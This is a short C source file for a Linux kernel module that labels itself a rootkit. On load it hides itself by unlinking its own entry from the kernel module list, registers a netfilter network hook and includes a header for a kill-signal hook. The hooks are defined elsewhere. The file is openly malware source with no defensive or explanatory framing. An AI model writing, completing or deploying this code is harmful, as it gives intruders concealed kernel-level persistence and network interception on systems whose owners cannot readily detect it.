#include <linux/kernel.h>
#include <linux/module.h>
#include "../include/hook_net.h" 
#include "../include/hook_kill.h"

struct list_head *prev_module;

#ifdef MODULE
extern struct module __this_module;
#define THIS_MODULE (&__this_module)
#else
#define THIS_MODULE ((struct module *)0)
#endif

void start_hide(void){
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

int init_module() {
  printk(KERN_INFO "Starting Rootkit\n");
  start_hide();
  register_net_hook();
  return 0;
}


void cleanup_module() {
  nf_unregister_net_hook(&init_net, &nfhook);
  printk(KERN_INFO "Stoping Rootkit\n");
}

MODULE_LICENSE("GPL");
